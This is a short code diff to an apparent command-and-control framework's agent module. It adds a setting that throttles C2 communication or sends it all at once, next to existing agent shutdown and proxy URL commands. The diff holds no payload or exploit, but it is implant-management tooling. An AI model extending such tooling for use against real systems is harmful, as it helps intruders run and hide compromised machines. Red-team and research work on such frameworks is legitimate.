@@ -41,6 +41,13 @@ export default class AgentModule extends BaseModule {
                 arguments: ["<agent id>"],
                 description: "shutdown the agent, confirm by entering the id, agent will not reconnect",
             },
+            "set throttle_sendq": {
+                arguments: ["<1|0>"],
+                description: "throttle c2 communication (enable) or just send it all at once (disable)",
+                execute: (params: string) => {
+                    this.config.throttle_sendq = params != "0" && params != "false" ? true : false;
+                },
+            },
             "set proxy_url": {
                 arguments: ["<url>"],
                 description: "change the proxy url to use (http://proxy.domain.tld/proxy.php)",
